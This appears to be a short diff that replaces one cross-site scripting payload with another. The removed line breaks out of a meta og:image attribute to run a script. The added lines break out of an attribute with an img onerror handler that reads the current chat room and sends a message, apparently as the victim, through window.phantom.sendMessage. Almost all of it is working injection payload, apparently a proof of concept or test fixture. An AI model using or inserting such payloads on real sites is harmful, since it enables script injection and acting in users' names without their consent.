@@ -1,1 +1,4 @@
-<meta property="og:image" content="https://example.com/a.png\></div><script>console.log('XSS')</script>">
+" ><img src="x" onerror="
+  const currentRoom = document.querySelector('#tb-room').textContent;
+  window.phantom.sendMessage(currentRoom, 'I am running an unauthorized script!');
+">
